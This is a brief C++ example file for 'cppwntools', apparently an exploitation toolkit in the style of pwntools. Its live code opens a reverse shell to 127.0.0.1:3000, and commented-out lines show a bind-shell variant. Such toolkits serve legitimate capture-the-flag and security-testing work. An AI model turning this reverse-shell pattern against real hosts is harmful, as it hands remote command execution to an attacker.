#include "../include/Remote.hpp"
#include "../include/Process.hpp"
#include "../include/Shell.hpp"
#include "../include/Server.hpp"

#include <iostream>

int main() {
    using namespace cppwntools;
    
    /*
    constexpr bool is_local = false;
    std::unique_ptr<Stream> conn{ nullptr };
    
    if constexpr (is_local) {
      conn = std::make_unique<Process>("/bin/cat");
    } else {
      conn = std::make_unique<Remote>("127.0.0.1", 3000);
    }

    conn->interactive();
    */

    // Bind Shell example
    // Server server(3000);
    // std::unique_ptr<Stream> client = server.accept();
    // connect_shell(*client);

    // Reverse Shell example
    Remote conn("127.0.0.1", 3000);
    connect_shell(conn);

    /*
    while(conn->is_alive()) {
      conn->sendline("Hello, world!");
      std::cout << "Got: " << conn->recvline();
    }*/
}
